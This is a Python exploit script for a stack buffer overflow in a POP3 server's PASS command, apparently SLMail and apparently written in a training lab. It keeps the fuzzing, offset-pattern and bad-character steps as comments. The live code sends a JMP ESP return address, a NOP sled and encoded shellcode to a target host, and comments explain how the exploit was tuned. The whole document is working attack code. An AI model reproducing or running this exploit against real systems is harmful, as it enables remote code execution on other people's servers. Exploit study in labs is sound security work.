#!/usr/bin/python
import socket

# TIME = 16 MINUTES 33 SECONDS from fuzzing to exploit development to proof of concept
# buffer=["A"]
# counter=100
# while len(buffer) <= 30:
# 	buffer.append("A"*counter)
# 	counter+=200
# for string in buffer:
# 	print "Fuzzing PASS with {} bytes".format(str(len(string)))
# 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# 	connect=s.connect(("10.11.11.158",110))
# 	s.recv(1024)
# 	s.send("USER test\r\n")
# 	s.recv(1024)
# 	s.send("PASS"+string+'\r\n')
# 	s.send("QUIT\r\n")
# 	s.close()
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#buffer = ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9")

#buffer = "A"*2606 + "B"*4 + "C" * (2700-2606-4)
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode=("\xb8\xab\x50\x45\xc5\xd9\xce\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x43\x12\x83\xc3\x04\x03\xe8\x5e\xa7\x30\x12\xb6\xa5"
"\xbb\xea\x47\xca\x32\x0f\x76\xca\x21\x44\x29\xfa\x22\x08\xc6"
"\x71\x66\xb8\x5d\xf7\xaf\xcf\xd6\xb2\x89\xfe\xe7\xef\xea\x61"
"\x64\xf2\x3e\x41\x55\x3d\x33\x80\x92\x20\xbe\xd0\x4b\x2e\x6d"
"\xc4\xf8\x7a\xae\x6f\xb2\x6b\xb6\x8c\x03\x8d\x97\x03\x1f\xd4"
"\x37\xa2\xcc\x6c\x7e\xbc\x11\x48\xc8\x37\xe1\x26\xcb\x91\x3b"
"\xc6\x60\xdc\xf3\x35\x78\x19\x33\xa6\x0f\x53\x47\x5b\x08\xa0"
"\x35\x87\x9d\x32\x9d\x4c\x05\x9e\x1f\x80\xd0\x55\x13\x6d\x96"
"\x31\x30\x70\x7b\x4a\x4c\xf9\x7a\x9c\xc4\xb9\x58\x38\x8c\x1a"
"\xc0\x19\x68\xcc\xfd\x79\xd3\xb1\x5b\xf2\xfe\xa6\xd1\x59\x97"
"\x0b\xd8\x61\x67\x04\x6b\x12\x55\x8b\xc7\xbc\xd5\x44\xce\x3b"
"\x19\x7f\xb6\xd3\xe4\x80\xc7\xfa\x22\xd4\x97\x94\x83\x55\x7c"
"\x64\x2b\x80\xd3\x34\x83\x7b\x94\xe4\x63\x2c\x7c\xee\x6b\x13"
"\x9c\x11\xa6\x3c\x37\xe8\x21\x49\xc3\xf2\x9c\x25\xd1\xf2\xdf"
"\x0e\x5c\x14\xb5\x60\x09\x8f\x22\x18\x10\x5b\xd2\xe5\x8e\x26"
"\xd4\x6e\x3d\xd7\x9b\x86\x48\xcb\x4c\x67\x07\xb1\xdb\x78\xbd"
"\xdd\x80\xeb\x5a\x1d\xce\x17\xf5\x4a\x87\xe6\x0c\x1e\x35\x50"
"\xa7\x3c\xc4\x04\x80\x84\x13\xf5\x0f\x05\xd1\x41\x34\x15\x2f"
"\x49\x70\x41\xff\x1c\x2e\x3f\xb9\xf6\x80\xe9\x13\xa4\x4a\x7d"
"\xe5\x86\x4c\xfb\xea\xc2\x3a\xe3\x5b\xbb\x7a\x1c\x53\x2b\x8b"
"\x65\x89\xcb\x74\xbc\x09\xfb\x3e\x9c\x38\x94\xe6\x75\x79\xf9"
"\x18\xa0\xbe\x04\x9b\x40\x3f\xf3\x83\x21\x3a\xbf\x03\xda\x36"
"\xd0\xe1\xdc\xe5\xd1\x23")
# bad character #1 = 0x0a which rendered to 0x29
# bad character #2 = 0x0d which rendere to 0x0e
# bad character #3 = 0x00 which is null byte, usually segfaults
# !mona find -s "\xff\xe4" -m slmfc.dll

# 5F4A358F
ret = "\x8f\x35\x4a\x5f"# JMP ESP INSTRUCTION
#buffer = "A" * 2606 + "B" * 4 + badchars
# Non-operators ALWAYS goes before the shellcode as it creates a overwritable buffer to prevent overwriting of the initial first few lines of the shikata_ga_nai XOR additive feedback decoder. Otherwise the exploit will fail
buffer = "A" * 2606 + ret + "\x90" * 16 + shellcode + "C"*(3500-16-4-351-2606)
# "C" * (3500-2606-4)
# Another lesson learned, if you fail to subtract -2606 from the buffer of C's, the buffer expands too large causing the buffer overflow exploit to fail as well.

try:
        print "\nSending evil buffer"
        s.connect(("10.11.11.158",110))
        data=s.recv(1024)
        s.send('USER username'+'\r\n')
        data=s.recv(1024)
        s.send('PASS ' + buffer + '\r\n')
        print('\nDone!')
except:
        print "Could not connect to POP3 server"